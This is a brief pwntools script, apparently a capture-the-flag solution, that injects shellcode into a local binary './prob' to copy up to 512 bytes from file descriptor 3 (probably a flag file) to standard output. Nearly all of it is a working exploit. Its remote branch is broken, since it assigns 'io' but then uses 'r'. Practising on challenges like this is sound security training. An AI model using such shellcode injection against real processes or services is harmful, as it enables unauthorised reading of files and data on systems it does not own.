from pwn import *

REMOTE = False
context.arch = 'amd64'

if REMOTE:
    io = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process('./prob')

shellcode = asm(shellcraft.sendfile(1, 3, 0, 512))

r.send(shellcode)

r.interactive()
